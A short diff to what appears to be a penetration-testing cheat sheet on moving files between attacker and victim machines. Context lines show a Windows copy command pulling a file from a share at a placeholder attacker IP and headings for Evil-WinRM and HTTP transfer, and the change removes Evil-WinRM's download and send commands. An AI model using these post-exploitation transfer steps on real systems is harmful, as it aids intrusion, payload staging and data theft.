@@ -33,12 +33,7 @@ copy \\<attacker-ip>\<share>\<file> <local-path>
 ```
 
 ### 1.2. Evil-WinRM (two ways)
-The `evil-winrm` tool is able to perform file transfer out of the box if only session is established.
 
-```bash
-> download <file>
-> send <file>
-```
 
 ### 1.3. HTTP (attacker -> victim)
 Attacker:
